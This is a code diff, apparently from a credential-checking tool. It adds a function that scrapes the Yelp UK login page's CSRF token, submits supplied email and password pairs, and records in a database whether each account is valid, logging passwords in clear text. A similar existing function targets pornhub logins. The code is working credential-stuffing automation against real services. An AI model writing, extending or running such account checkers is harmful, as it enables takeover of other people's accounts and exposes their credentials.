@@ -20,7 +20,32 @@ import logging as log
 #                                 data={"username": usr, "password": pwd, "csrf_token": csrf},
 #                                 cookies=cookies)
 #     print(res.content)
-#
+
+def yelp(usr, pwd, mr):
+    mr : ManageRequests
+    site_url = "https://www.yelp.co.uk/login"
+
+    # Get main page with csrftok
+    res = mr.req.get(site_url, headers={'User-Agent': 'Mozilla/5.0'})
+    # Filter out csrftok value
+    soup = BeautifulSoup(res.text, features="html.parser")
+    csrftok = soup.find('form', id='ajax-login').find('input', 'csrftok')['value']
+
+    # Post request to login
+    res = mr.post_with_checks(site_url,
+                              data={'email': usr,
+                                    'password': pwd,
+                                    'csrftok': csrftok
+                                    })
+
+    if 'login' not in res.url:
+        mr.db.update_result(usr, pwd, "yelp", "True")
+        log.info("Account valid {}".format(usr))
+    else:
+        mr.db.update_result(usr, pwd, "yelp", "False")
+        log.info("Account error {} {}".format(usr, pwd))
+    log.info("-------------------------------")
+    mr.req.cookies.clear()
 
 def pornhub(usr, pwd, mr):
     mr : ManageRequests
@@ -43,7 +68,7 @@ def pornhub(usr, pwd, mr):
                                     'remember_me': '0',
                                     'from': 'pc_login_modal_:index',
                                     'redirect': redirect,
-                                    'token': token,
+                                    'token': token
                                     })
 
     if int(json.loads(res.content)["success"]) == 1:
